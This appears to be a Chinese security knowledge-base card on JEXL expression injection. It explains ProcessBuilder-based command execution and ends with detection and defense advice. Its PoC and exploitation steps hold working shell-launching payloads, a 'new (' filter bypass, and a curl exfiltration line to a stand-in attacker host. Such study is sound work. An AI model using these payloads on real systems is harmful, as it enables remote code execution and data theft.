---
id: web-java-expression-jexl-new-processbuilder-command-exec
title: JEXL new() 实例化 ProcessBuilder 命令执行：数组字面量或 split 构造 String[]
type: scenario
domain: web
path: web/java/expression
technique: jexl-new-processbuilder-array-literal-command-execution
aliases:
- JEXL 命令执行
- JEXL ProcessBuilder
- new('java.lang.ProcessBuilder')
- commons-jexl3 RCE
- 表达式注入命令执行
tags:
- java
- jexl
- expression-injection
- rce
- processbuilder
- command-execution
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V365
  verified_at: '2026-11-09T04:23:22+08:00'
  notes: 已对照原文及本地 commons-jexl3 3.2 实测核对：new('java.lang.ProcessBuilder', ['java','-version']).start().waitFor() 返回 0，数组字面量可构造 String[]；new('java.lang.String[]',...) 报 unsolvable function/method 与原文一致；PoC、类名、触发条件均与原文相符；版本表述 3.3+ JexlPermissions / 3.2 及更早 JexlSandbox 正确。未验证无回显外带与 Windows 分支。
---

## 一句话结论

当应用把可控字符串交给 Commons JEXL 的 `createExpression(...).evaluate(...)` 求值且引擎允许 `new` 时，`new('java.lang.ProcessBuilder', ['/bin/bash','-c','<cmd>']).start()` 即可实例化 `ProcessBuilder` 并启动进程执行任意命令；JEXL 不能 `new` 数组类型，数组实参需用数组字面量或 `split` 生成。

## 原理

- JEXL（Apache Commons JEXL）是 Java 表达式引擎，应用若把用户输入交给 `JexlEngine.createExpression(exp).evaluate(ctx)` 即形成表达式注入；表达式支持 `new('全限定类名', 构造参数...)`，第一个参数可以是字符串、变量或 Class 对象，其余作为构造参数，因此可以实例化任意类。
- `ProcessBuilder` 的构造器需要 `String[]` 或 `List<String>`。直接写 `new('java.lang.String[]', 'a','b','c')` 会失败，报 `unsolvable function/method 'java.lang.String[](String, String, String)'`——JEXL 不会通过 `new` 实例化数组类型。
- 两种可用的数组构造方式：
  - 数组字面量：`['/bin/bash','-c','id']`。JEXL 会按元素类型强转数组，元素全为 String 时得到 `String[]`；
  - `split`：`'open -a Calculator'.split(' ')` 返回 `String[]`。
- `.start()` 是 `ProcessBuilder` 的实例方法，调用后启动子进程即完成命令执行。返回值是 `Process` 对象，不直接带回显，需要借助写文件、DNS/HTTP 外带等副作用确认。
- 边界：JEXL 3.3+ 的 `JexlPermissions`（3.2 及更早为 `JexlSandbox`）若禁止 `new` 或限制 `java.lang.ProcessBuilder` 等类，该链会被拦截；原文演示环境为 commons-jexl3 3.2，默认允许。

## 触发条件

- 应用存在 JEXL 表达式求值入口，且表达式字符串可由用户控制（规则引擎、筛选条件、模板属性、配置项、请求参数等）。
- 引擎允许 `new`，permissions/sandbox 配置未禁止 `ProcessBuilder` 等 JDK 类。
- 目标为 JDK 环境；能接受无回显，需用外带或写文件验证。

## 利用步骤

1. 提交 `1+1` 或 `''.class` 等简单表达式，确认求值结果与 JEXL 版本。
2. 提交数组字面量形式的 `ProcessBuilder` 表达式；若 `new(` 子串被过滤，写成 `new (`（`new` 与 `(` 之间加空格）绕过。
3. 无回显时改用 `sh -c '<cmd> > /tmp/x'`、`curl http://attacker/...` 等方式外带结果。

## PoC

```java
// 数组字面量（推荐的 String[] 构造方式）
new('java.lang.ProcessBuilder', ['/bin/bash','-c','open -a Calculator']).start()

// split 方式
new('java.lang.ProcessBuilder', 'open -a Calculator'.split(' ')).start()

// Linux 外带示例
new('java.lang.ProcessBuilder', ['/bin/bash','-c','curl http://attacker/`id`']).start()
```

Windows 目标把 `/bin/bash -c` 换成 `cmd.exe /c`。

## 变体与关联

- JEXL 纯表达式不能直接调用静态方法，`Runtime.getRuntime().exec(...)` 这类写法通常不可用；`ProcessBuilder` 构造器加实例方法是最直接的命令执行原语。
- 引号/关键字被过滤时，用数字方法链构造类名与命令，见 [[web-java-expression-jexl-no-quote-string-construction-bypass]]。
- 文件读写、反序列化触发与 SnakeYAML 组件 gadget 分别见 [[web-java-expression-jexl-file-read-write-scanner-fileoutputstream]]、[[web-java-expression-jexl-objectinputstream-deserialization]]、[[web-java-expression-jexl-snakeyaml-load-gadget]]。
- 其他表达式引擎的等价写法：SpEL `T(...)`、OGNL `@java.lang.Runtime@getRuntime()`，根因都是用户输入进入表达式求值。

## 检测与防御

- 检测：表达式参数中出现 `new(`、`ProcessBuilder`、`Runtime`、`.start()`、`split(` 等片段；JEXL 异常中的 `unsolvable function/method`；Java 进程树出现 shell/curl 等子进程。
- 防御：不要把用户输入当 JEXL 表达式求值；必须求值时使用白名单 AST（只允许变量、算术、比较），并配置 `JexlPermissions`（3.3+）/`JexlSandbox`（3.2 及更早）禁止 `new` 与危险类。
- 加固：移除不必要依赖，求值服务最小权限运行并做沙箱与资源限制。
